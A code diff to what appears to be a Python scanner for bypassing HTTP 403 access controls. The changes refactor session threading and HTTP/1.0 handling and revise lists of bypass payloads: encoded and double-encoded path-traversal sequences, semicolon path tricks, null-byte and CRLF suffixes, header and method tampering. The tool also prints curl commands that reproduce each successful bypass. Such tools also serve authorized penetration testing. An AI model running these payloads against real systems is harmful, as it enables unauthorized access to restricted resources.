@@ -16,7 +16,7 @@ import urllib3
 import colorama
 from colorama import Fore, Style
 import socket
-from threading import Lock
+from threading import Lock, local
 import http.client
 
 # Disable SSL warnings
@@ -24,6 +24,23 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Initialize colorama (only once)
 colorama.init(autoreset=True)
+
+# ---------------- HELPERS -----------------
+def _join_url(base: str, frag: str) -> str:
+    """Safely join base URL and fragment ensuring a leading slash for the fragment."""
+    return f"{base}{frag if frag.startswith('/') else '/' + frag}"
+
+_thread_local = local()
+def _get_thread_session(ctx) -> requests.Session:
+    """Thread-local requests.Session to avoid serializing concurrent calls."""
+    sess = getattr(_thread_local, "session", None)
+    if sess is None:
+        sess = requests.Session()
+        sess.verify = False
+        # inherit default headers from the main session
+        sess.headers.update(ctx.session.headers)
+        _thread_local.session = sess
+    return sess
 
 # ---------------- DATA MODELS -----------------
 @dataclass
@@ -119,48 +136,51 @@ def make_request(ctx: BypassContext, url: str, method: str = "GET",
         
         # Handle HTTP/1.0 request
         if http_version == "1.0":
-            # Store original values
-            orig_vsn = http.client.HTTPConnection._http_vsn
-            orig_vsn_str = http.client.HTTPConnection._http_vsn_str
-            
-            # Force HTTP/1.0
+            # Store original values (HTTP and HTTPS) and force HTTP/1.0
+            orig_vsn_h1 = http.client.HTTPConnection._http_vsn
+            orig_str_h1 = http.client.HTTPConnection._http_vsn_str
+            orig_vsn_hs = http.client.HTTPSConnection._http_vsn
+            orig_str_hs = http.client.HTTPSConnection._http_vsn_str
+
             http.client.HTTPConnection._http_vsn = 10
             http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
+            http.client.HTTPSConnection._http_vsn = 10
+            http.client.HTTPSConnection._http_vsn_str = 'HTTP/1.0'
             
             try:
-                # Create a new session for HTTP/1.0
+                # Use a temporary session to avoid interfering with thread-local
                 temp_session = create_session()
-                with ctx.session_lock:
-                    response = temp_session.request(
-                        method=method,
-                        url=url,
-                        headers=headers,
-                        allow_redirects=allow_redirects,
-                        timeout=timeout or ctx.args.timeout,
-                        verify=False,
-                        data=data,
-                        proxies=proxies
-                    )
-                return response
-            finally:
-                # Restore original values
-                http.client.HTTPConnection._http_vsn = orig_vsn
-                http.client.HTTPConnection._http_vsn_str = orig_vsn_str
-        else:
-            # Normal request with thread safety
-            timeout = timeout or ctx.args.timeout
-            
-            with ctx.session_lock:
-                response = ctx.session.request(
+                response = temp_session.request(
                     method=method,
                     url=url,
                     headers=headers,
                     allow_redirects=allow_redirects,
-                    timeout=timeout,
+                    timeout=timeout or ctx.args.timeout,
                     verify=False,
                     data=data,
                     proxies=proxies
                 )
+                return response
+            finally:
+                # Restore original values
+                http.client.HTTPConnection._http_vsn = orig_vsn_h1
+                http.client.HTTPConnection._http_vsn_str = orig_str_h1
+                http.client.HTTPSConnection._http_vsn = orig_vsn_hs
+                http.client.HTTPSConnection._http_vsn_str = orig_str_hs
+        else:
+            # Normal request using a thread-local Session (no global lock)
+            timeout = timeout or ctx.args.timeout
+            session = _get_thread_session(ctx)
+            response = session.request(
+                method=method,
+                url=url,
+                headers=headers,
+                allow_redirects=allow_redirects,
+                timeout=timeout,
+                verify=False,
+                data=data,
+                proxies=proxies
+            )
             return response
         
     except requests.exceptions.SSLError as e:
@@ -255,7 +275,7 @@ def test_baseline(ctx: BypassContext) -> Dict[str, Any]:
     return baseline
 
 def report_bypass(ctx: BypassContext, method: str, url: str, status_code: int, 
-                 content_length: int, payload: str = ""):
+                 content_length: int, payload: str = "", headers: Optional[Dict[str, str]] = None):
     """Report a successful bypass"""
     if status_code < 400:
         success_marker = f"{Fore.GREEN}[+] BYPASS FOUND"
@@ -281,25 +301,24 @@ def report_bypass(ctx: BypassContext, method: str, url: str, status_code: int,
         print_curl_command(ctx, url, method, payload)
 
 def print_curl_command(ctx: BypassContext, url: str, method_name: str, payload: str):
-    """Print a curl command to reproduce the successful bypass"""
+    """Print a curl command to reproduce the successful bypass (fixed CASE handling)"""
     method = "GET"
     headers = {}
-    
-    if method_name.startswith("HTTP-METHOD-"):
-        method = method_name.replace("HTTP-METHOD-", "")
-    
+
+    if method_name.startswith("HTTP-METHOD-CASE-"):
+        method = method_name.split("HTTP-METHOD-CASE-", 1)[1]
+    elif method_name.startswith("HTTP-METHOD-"):
+        method = method_name.split("HTTP-METHOD-", 1)[1]
+
     if method_name == "HTTP-HEADER" and ":" in payload:
         header_name, header_value = payload.split(":", 1)
         headers[header_name.strip()] = header_value.strip()
-    
+
     curl_cmd = f"curl -k -s '{url}'"
-    
     for header, value in headers.items():
         curl_cmd += f" -H '{header}: {value}'"
-    
-    if method != "GET":
+    if method.upper() != "GET":
         curl_cmd += f" -X {method}"
-    
     ctx.print_safe(f"{Fore.YELLOW}    Reproduce: {curl_cmd}{Style.RESET_ALL}")
 
 def generate_ip_variations():
@@ -534,6 +553,7 @@ def advanced_path_manipulation(ctx: BypassContext):
         return
     
     base_url = f"{ctx.parsed_url.scheme}://{ctx.parsed_url.netloc}"
+    base_path = ctx.path if ctx.path.startswith('/') else '/' + ctx.path
     
     # Encoded leading slash variations
     ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Encoded Leading Slash...{Style.RESET_ALL}")
@@ -541,7 +561,7 @@ def advanced_path_manipulation(ctx: BypassContext):
     
     futures_map = {}
     for enc_slash in encoded_slashes:
-        target_url = f"{base_url}/{enc_slash}{ctx.path.lstrip('/')}"
+        target_url = _join_url(base_url, f"/{enc_slash}{ctx.path.lstrip('/')}")
         future = ctx.pool.submit(make_request, ctx, target_url)
         futures_map[future] = target_url
     
@@ -552,17 +572,17 @@ def advanced_path_manipulation(ctx: BypassContext):
             report_bypass(ctx, "ENCODED-LEADING-SLASH", target_url, 
                         response.status_code, len(response.content))
     
-    # Semicolon variations
+    # Semicolon variations (fixed to be valid path forms)
     ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Semicolon Variations...{Style.RESET_ALL}")
     semicolon_patterns = [
-        f";{ctx.path}",
-        f"{ctx.path};",
-        f";/{ctx.path.lstrip('/')}",
-        f"{ctx.path};/",
-        f";%2f{ctx.path.lstrip('/')}",
-        f";/%2e%2e{ctx.path}",
-        f"%3b{ctx.path}",
-        f"{ctx.path}%3b"
+        f"/;{base_path.lstrip('/')}",
+        f"{base_path};",
+        f"/;{base_path.lstrip('/')}/",
+        f"{base_path};/",
+        f"/;%2f{base_path.lstrip('/')}",
+        f"/;/%2e%2e{base_path}",
+        f"/%3b{base_path.lstrip('/')}",
+        f"{base_path}%3b"
     ]
     
     if ctx.args.fast:
@@ -570,7 +590,7 @@ def advanced_path_manipulation(ctx: BypassContext):
     
     semicolon_futures = {}
     for pattern in semicolon_patterns:
-        target_url = f"{base_url}{pattern}"
+        target_url = _join_url(base_url, pattern)
         future = ctx.pool.submit(make_request, ctx, target_url)
         semicolon_futures[future] = target_url
     
@@ -866,7 +886,7 @@ def url_encoding_bypass(ctx: BypassContext):
         "%252e%252e%252f", ".%2e/", "%2e./", "..%2f", ".%252e/", "%252e./",
         "..%252f", "..\\", "..%5c", "..%c0%af", "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af",
         "..%25%32%66", "..%%32f", "..%%32%66", "..%u2215", "..%c0%9v", "..%ef%bc%8f",
-        "?", "#", "//%09/", "/%09/", "/%5c/", ";/%2f/", ";%09", "%20", "%23",
+        "?", ";", "//%09/", "/%09/", "/%5c/", ";/%2f/", ";%09", "%20", 
         "%2e", "%2f", "%3b", "%3f", "%26", "%0a", "%0d"
     ]
     
@@ -1013,9 +1033,10 @@ def file_extension_bypass(ctx: BypassContext):
         extensions = extensions[:10]
     
     futures_map = {}
-    # Add extensions to URL
+    # Add extensions to URL (fixed to strip query first)
+    base_no_query = ctx.original_url.split('?', 1)[0].rstrip('/')
     for ext in extensions:
-        ext_url = ctx.original_url + ext
+        ext_url = f"{base_no_query}{ext}"
         future = ctx.pool.submit(make_request, ctx, ext_url)
         futures_map[future] = (ext_url, "add")
     
@@ -1071,8 +1092,8 @@ def parameter_pollution_bypass(ctx: BypassContext):
         future = ctx.pool.submit(make_request, ctx, param_url)
         futures_map[future] = (param_url, "param")
     
-    # Special characters
-    special_chars = ['#', ';', '%00', '%09', '%0d%0a']
+    # Special characters (removed '#' fragment which isn't sent to server)
+    special_chars = [';', '%00', '%09', '%0d%0a']
     for char in special_chars:
         if '?' in ctx.original_url:
             param_url = f"{ctx.original_url}{char}&bypass=1"
@@ -1252,8 +1273,9 @@ def special_character_bypass(ctx: BypassContext):
     """Try special characters to bypass path restrictions"""
     ctx.print_safe(f"\n{Fore.BLUE}[*] Testing Special Character Bypasses...{Style.RESET_ALL}")
     
+    # Removed raw '#' which becomes a fragment and isn't sent to server
     special_chars = [
-        '#', '%', '\\', '?', ';', '*', '~', '[', ']', '@',
+        '%', '\\', '?', ';', '*', '~', '[', ']', '@',
         '!', ',', '&', "'", '(', ')', '+', '=', '"', '<', '>',
         '{', '}', '|', '^', '`'
     ]
@@ -1464,7 +1486,7 @@ def fuzzing_bypass(ctx: BypassContext):
         ("%5c", "\\"), ("%25", "%"), ("%3b", ";"), ("%26", "&"),
         ("%3d", "="), ("%3f", "?"), ("%23", "#"), ("%40", "@"),
         ("%7e", "~"), ("%60", "`"), ("%7c", "|"), ("%5e", "^"),
-        ("%7b", "{"), ("%7d", "}"), ("%5b", "["), ("%5d", "]"),
+        ("%7b", "{"), ("%7d", "}" ), ("%5b", "["), ("%5d", "]"),
         ("%3c", "<"), ("%3e", ">"), ("%22", "\""), ("%27", "'"),
         ("%2b", "+"), ("%2c", ","), ("%3a", ":")
     ]
@@ -1539,14 +1561,18 @@ def content_type_bypass(ctx: BypassContext):
     for content_type in content_types:
         headers = {"Content-Type": content_type}
         
-        # GET request
+        # GET request (always fine)
         future = ctx.pool.submit(make_request, ctx, ctx.original_url, headers=headers)
         futures_map[future] = (content_type, "GET", None)
         
-        # POST request
-        data = "{}" if "json" in content_type else "data=test"
-        future = ctx.pool.submit(make_request, ctx, ctx.original_url, "POST", headers, True, ctx.args.timeout, data)
-        futures_map[future] = (content_type, "POST", data)
+        # POST request (skip malformed multipart without boundary)
+        if content_type.startswith("multipart/form-data"):
+            # Skip POST for multipart to avoid malformed body without boundary
+            pass
+        else:
+            data = "{}" if "json" in content_type else "data=test"
+            future = ctx.pool.submit(make_request, ctx, ctx.original_url, "POST", headers, True, ctx.args.timeout, data)
+            futures_map[future] = (content_type, "POST", data)
     
     for future in as_completed(futures_map):
         content_type, method, data = futures_map[future]
@@ -1571,15 +1597,14 @@ def endpath_suffix_bypass(ctx: BypassContext):
         suffixes = [
             "/", "//", "/.", "/./", "/..;/", "..;/",
             "%00", "%2500", "%09", "%0A", "%0D", "%20", "%20/", "%2520",
-            "%2520%252F", "%23", "%2523", "%26", "%2526", "%3f", "%253F",
-            "?", "??", "???", "?WSDL", "?debug=1", "?debug=true",
-            "?param", "?testparam",
-            ".json", ".html", ".php", ".css", ".svc", ".svc?wsdl",
-            ".wsdl", ".random",
-            "°/", "#", "#/", "#/./", "%25", "%2525", "%61", "%2561",
+            "%2520%252F", # removed raw '#': "#", "#/", "#/./"
+            "%25", "%2525", "%61", "%2561",
             "&", "-", ".", "~", "//", "\\/\\/", "/;", "%2f..%2f..%2f",
             "/*", "/%2e", "/%2f", "/%ef%bc%8f", "/..%3B/", ";%2f..%2f",
-            "debug", "false", "null", "true"
+            "debug", "false", "null", "true",
+            ".json", ".html", ".php", ".css", ".svc", ".svc?wsdl",
+            ".wsdl", ".random", "?WSDL", "?debug=1", "?debug=true",
+            "?param", "?testparam"
         ]
     
     if ctx.args.fast:
